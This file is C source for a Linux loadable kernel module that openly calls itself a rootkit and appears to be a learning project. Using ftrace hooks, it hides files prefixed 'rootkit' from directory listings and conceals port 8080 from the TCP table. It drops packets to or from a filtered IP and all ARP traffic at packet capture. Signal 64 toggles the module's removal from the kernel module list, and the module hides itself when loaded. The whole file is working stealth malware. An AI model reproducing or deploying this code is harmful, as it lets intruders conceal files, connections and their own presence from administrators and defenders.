
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/string.h>
#include <linux/netfilter_defs.h>

 // the ip addr to filter (127.0.0.1)
#define ipv4_filter_sorce 0x100007f
#define ipv4_filter_dest 0x100007f
//file or prosses to hide 
#define PREFIX "rootkit"
// listen port to hide
#define H_PORT 8080
// rootkit name that is valid to remove
#define rootkit_name "rootkit"
MODULE_LICENSE("GPL");
MODULE_VERSION("0.02");


static asmlinkage long (*original_packet_rcv)(struct sk_buff *, struct net_device *, 
    struct packet_type *, struct net_device *);
static asmlinkage long (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, 
    struct packet_type *, struct net_device *);
static asmlinkage long (*original_packet_rcv_spkt)(struct sk_buff *, struct net_device *, 
    struct packet_type *, struct net_device *);
static struct list_head *prev_module;
static short hidden = 0;

void showme(void);
void hideme(void);
/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_getdents64 and hook_getdents64 functions differently
 * depending on the kernel version. This is the larget barrier to
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_delete_module_func)(const struct pt_regs *);



asmlinkage long delete_module_func(const struct pt_regs *regs)
{
    long ret;
    //add find_module fuction from kernal


    char module_name[MODULE_NAME_LEN];
    int name_len;
    struct module mod;
    const char __user *name_user = (const char __user *)regs->di;
    //copy from user
    name_len = copy_from_user(module_name, name_user, MODULE_NAME_LEN -1 );
    printk(KERN_INFO "name_len %d", name_len);
    if (name_len < 0 ) {
        printk(KERN_INFO "failed");
        goto done;     
    }
    //adding null bit at the end
    module_name[MODULE_NAME_LEN - 1] = '\0';
    printk(KERN_INFO "module_name: %s ,rootkit name: %s and the strcmp: %d \n",module_name,rootkit_name, strcmp(module_name,rootkit_name));

    if  (strcmp(module_name,rootkit_name) == 0){
        printk(KERN_INFO "deleting myself");
        if (hidden == 1){
        showme();
        }
    } 

done:
    printk(KERN_INFO "done");
    ret = orig_delete_module_func(regs);    
    return ret;
}


/* After grabbing the sig out of the pt_regs struct, just check
 * for signal 64 (unused normally) and, using "hidden" as a toggle
 * we either call hideme(), showme() or the real sys_kill()
 * syscall with the arguments passed via pt_regs. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void showme(void);
    void hideme(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( (sig == 64) && (hidden == 0) )
    {
        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
        hideme();
        hidden = 1;
    }
    else if ( (sig == 64) && (hidden == 1) )
    {
        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
        showme();
        hidden = 0;
    }
    else
    {
        return orig_kill(regs);
    }
    return 0;
}
/* This is our hooked function for sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    // int count = regs->dx;

    long error;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;

}

/* This is our hook for sys_getdetdents */
asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    /* The linux_dirent struct got removed from the kernel headers so we have to
     * declare it ourselves */
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    // int count = regs->dx;

    long error;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;

}
#else
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig)
{
    void showme(void);
    void hideme(void);

    if ( (sig == 64) && (hidden == 0) )
    {
        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
        hideme();
        hidden = 1;
    }
    else if ( (sig == 64) && (hidden == 1) )
    {
        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
        showme();
        hidden = 0;
    }
    else
    {
        return orig_kill(pid, sig);
    }

}
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
{
    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    long error;
        error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;
}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count)
{
    /* This is an old structure that isn't included in the kernel headers anymore, so we 
     * have to declare it ourselves */
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    long error;
        error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;
}
#endif

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short port = htons(H_PORT);

    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
                   ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}



int packet_check(struct sk_buff *skb)
{
    // this is the filter function that check the packet paramaters and return 1 if it need to hide or 0 if not

    /* check for ipv4 with specipt sender or reciver */
    if (skb->protocol == htons(ETH_P_IP)) {
        /* get ipv4 header */
        struct iphdr *header = ip_hdr(skb);
        // printk("got ip4 message from %x", header->saddr);
        /* look for source and destination address */
        if( ipv4_filter_sorce == header->saddr  || ipv4_filter_dest == header->daddr) {
            printk("IPV4 SENDER %x I4 IN LIST", header->saddr);

            /* ip in list, should be hidden */
            return 1;
        }
    }

    /* check for arp */
    if (skb->protocol == htons(ETH_P_ARP)) {
        struct ethhdr *eth = (struct ethhdr *) skb_mac_header(skb);
        unsigned char *src_mac = eth->h_source;
        printk("got arp message from  MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
       src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
            return 1;
    }

    /* check for ipv6 */
    // if(skb->protocol == htons(ETH_P_IPV6)) {
    //     /* get ipv6 header */
    //     struct ipv6hdr *header = ipv6_hdr(skb);

    //     /* look for source and destination address */
    //     if(find_packet_ipv6(header->saddr.s6_addr) || find_packet_ipv6(header->daddr.s6_addr)) {
    //         printk("IPV6 SENDER %pI6 IN LIST", 
    //             header->saddr.s6_addr);

    //         /* ip in list, should be hidden */
    //         return 1;
    //     }
    // }

    /* no ipv4 or ipv6 packet or not found in list */
    return 0;
}


int hook_packet_rcv(struct sk_buff *skb, struct net_device *dev, 
    struct packet_type *pt, struct net_device *orig_dev)
{
    int ret;

    /* Check if we need to hide packet */
    if(packet_check(skb)) {
        printk("PACKET DROP packet_rcv");
        return NF_DROP;
    }

    ret = original_packet_rcv(skb, dev, pt, orig_dev);



    return ret;
}

int hook_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, 
    struct packet_type *pt, struct net_device *orig_dev)
{
    int ret;

    /* Check if we need to hide packet */
    if(packet_check(skb)) {
        printk("PACKET DROP tpacket_rcv");
        return NF_DROP;
    }

    ret = original_tpacket_rcv(skb, dev, pt, orig_dev);



    return ret;
}

int hook_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, 
    struct packet_type *pt, struct net_device *orig_dev)
{
    int ret;

    /* Check if we need to hide packet */
    if(packet_check(skb)) {
        printk("PACKET DROP packet_rcv_spkt");
        return NF_DROP;
    }

    ret = original_packet_rcv_spkt(skb, dev, pt, orig_dev);



    return ret;
}

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("packet_rcv", hook_packet_rcv, &original_packet_rcv),
    HOOK("tpacket_rcv", hook_tpacket_rcv, &original_tpacket_rcv),
    HOOK("packet_rcv_spkt", hook_packet_rcv_spkt, &original_packet_rcv_spkt),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_delete_module", delete_module_func, &orig_delete_module_func),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;
    hideme();
    hidden = 1;
    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
